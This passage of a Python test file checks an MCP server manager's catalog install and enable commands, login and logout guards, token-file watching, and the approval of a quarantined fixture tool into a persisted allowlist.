        # Then the enable path connects it live (env expands at CONNECT time
        # against the process environment).
        monkeypatch.setenv("DEMO_API_KEY", "k")
        res = await asyncio.wait_for(
            handle_mcp_command(manager, {"action": "enable", "server": "mydemo"}), timeout=60,
        )
        assert res["ok"] and res["servers"][0]["state"] == "active"
        assert _on_disk(path)["mydemo"]["enabled"] is True
        # --enable at install time connects directly.
        res = await asyncio.wait_for(
            handle_mcp_command(
                manager, {"action": "catalog", "args": ["install", "demo", "--enable"]},
                environ={"DEMO_API_KEY": "k"},
            ),
            timeout=60,
        )
        assert res["ok"] and res["data"]["enabled"] is True
        assert res["servers"][0]["state"] == "active"
        assert "state: active" in res["message"]
        res = await handle_mcp_command(manager, {"action": "catalog", "args": ["install", "nope"]})
        assert res["ok"] is False
        res = await handle_mcp_command(
            manager, {"action": "catalog", "args": ["install", "demo", "--as", "mcp__x"]},
        )
        assert res["ok"] is False and "reserved" in res["message"]
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)


# ---------------------------------------------------------------------------
# login guards (non-network) + logout on a non-oauth server
# ---------------------------------------------------------------------------

async def test_login_and_logout_guards_on_non_oauth_specs(tmp_path):
    path = _write_catalog(tmp_path, {
        "tokeny": _stdio_server(env={"T_TOKEN": "${MISSING_T_TOKEN}"}),
        "half": {"transport": "http", "url": "https://example.invalid/mcp", "enabled": False,
                 "auth": "none", "oauth": {"client_id": "abc"}},
        "nourl": {"transport": "http", "url": "https://example.invalid/mcp", "enabled": False,
                  "auth": "oauth"},
    })
    manager = _manager(path, tmp_path)
    res = await handle_mcp_command(manager, {"action": "login", "server": "tokeny"}, environ={})
    assert res["ok"] is False and res["missing_env"] == ["MISSING_T_TOKEN"]
    res = await handle_mcp_command(manager, {"action": "login", "server": "half"})
    assert res["ok"] is False and "not configured for OAuth" in res["message"]
    res = await handle_mcp_command(manager, {"action": "logout", "server": "tokeny"})
    assert res["ok"] is False and "not an OAuth server" in res["message"]
    res = await handle_mcp_command(manager, {"action": "login"})
    assert res["ok"] is False and "usage" in res["message"]
    res = await handle_mcp_command(manager, {"action": "reauth"})
    assert res["ok"] is False and "usage" in res["message"]
    res = await handle_mcp_command(manager, {"action": "reauth", "args": ["--all"]})
    assert res["ok"] is True and res["rows"] == [] and "no enabled OAuth" in res["message"]
    # Concurrency guard is checked before any network activity.
    manager.logins_in_progress.add("nourl")
    res = await handle_mcp_command(manager, {"action": "login", "server": "nourl"})
    assert res["ok"] is False and "already in progress" in res["message"]
    manager.logins_in_progress.clear()
    # logout on an oauth server with no tokens is a clean no-op.
    res = await handle_mcp_command(manager, {"action": "logout", "server": "nourl"})
    assert res["ok"] is True and "was already empty" in res["message"]
    assert "/mcp login nourl" in res["message"]
    # Unknown action still reports the valid set.
    res = await handle_mcp_command(manager, {"action": "detonate"})
    assert res["ok"] is False and "unknown mcp_command action" in res["message"]


# ---------------------------------------------------------------------------
# token-file watch (manager-level, no network)
# ---------------------------------------------------------------------------

async def test_token_watch_task_runs_with_manager_lifecycle(tmp_path):
    path = _write_catalog(tmp_path, {
        "s": {"transport": "http", "url": "http://127.0.0.1:9/mcp", "auth": "oauth",
              "enabled": True, "timeouts": {"connect_s": 2}},
    })
    manager = _manager(path, tmp_path, token_watch_interval_s=0.05)
    spec = manager.specs["s"]

    class _FakeConn:
        state = State.NEEDS_AUTH

        def __init__(self):
            self.spec = spec

        async def start(self):
            return None

        async def stop(self):
            return None

    manager._make_connection = lambda s: _FakeConn()  # type: ignore[method-assign]  # noqa: SLF001
    reconnects: list[str] = []
    original = manager.reconnect

    async def _spy(name: str, reason: str = "") -> dict:
        reconnects.append(reason)
        return await original(name, reason)

    manager.reconnect = _spy  # type: ignore[method-assign]
    try:
        await asyncio.wait_for(manager.start(), timeout=10)
        assert manager._token_watch_task is not None  # noqa: SLF001
        await asyncio.sleep(0.2)  # baseline recorded
        token_file = manager.token_file_for(spec)
        token_file.parent.mkdir(parents=True)
        token_file.write_text(json.dumps({"access_token": "x", "expires_at": 4102444800}))
        assert await _wait_until(lambda: manager.token_reconnects == 1, 5)
        assert reconnects == ["token file changed on disk"]
        # Unchanged afterwards: no reconnect storm.
        await asyncio.sleep(0.3)
        assert manager.token_reconnects == 1
        os.utime(token_file, (2, 2))
        assert await _wait_until(lambda: manager.token_reconnects == 2, 5)
    finally:
        await asyncio.wait_for(manager.stop(), timeout=10)
    assert manager._token_watch_task is None  # noqa: SLF001


async def test_approve_registers_quarantined_tool_and_persists_allowlist(tmp_path):
    path = _write_catalog(tmp_path, {"fixture": _stdio_server(enabled=True)})
    manager = _manager(path, tmp_path)
    try:
        await asyncio.wait_for(manager.start(), timeout=40)
        before = await handle_mcp_command(manager, {"action": "tools", "server": "fixture"})
        assert "mcp__fixture__shady" not in {r["tool"] for r in before["rows"]}
        assert "/mcp approve fixture shady" in before["message"]

        # Guards: usage, unknown server, tool that is not quarantined.
        usage = await handle_mcp_command(manager, {"action": "approve", "server": "fixture"})
        assert usage["ok"] is False and "approve <server> <tool>" in usage["message"]
        unknown = await handle_mcp_command(
            manager, {"action": "approve", "server": "zzz", "args": ["shady"]})
        assert unknown["ok"] is False
        clean = await handle_mcp_command(
            manager, {"action": "approve", "server": "fixture", "args": ["echo"]})
        assert clean["ok"] is False and "not quarantined" in clean["message"]
        assert "shady" in clean["message"]

        emitted: list[dict] = []

        async def emit(ev: dict) -> None:
            emitted.append(ev)

        result = await handle_mcp_command(
            manager, {"action": "approve", "server": "fixture", "args": ["shady"]}, emit=emit)
        assert result["ok"] is True, result
        assert result["data"] == {"tool": "shady", "registered": True}
        assert "registered" in result["message"]
        assert any(ev.get("type") == "mcp_status" for ev in emitted)

        saved = load_catalog(path).specs["fixture"]
        assert saved.tools_allow_quarantined == ["shady"]
        after = await handle_mcp_command(manager, {"action": "tools", "server": "fixture"})
        assert "mcp__fixture__shady" in {r["tool"] for r in after["rows"]}
        assert not after["data"]["quarantine"]
        # Idempotent: approving again does not duplicate the allowlist entry.
        again = await handle_mcp_command(
            manager, {"action": "approve", "server": "fixture", "args": ["shady"]})
        assert again["ok"] is False and "not quarantined" in again["message"]
        assert load_catalog(path).specs["fixture"].tools_allow_quarantined == ["shady"]
    finally:
        await asyncio.wait_for(manager.stop(), timeout=30)

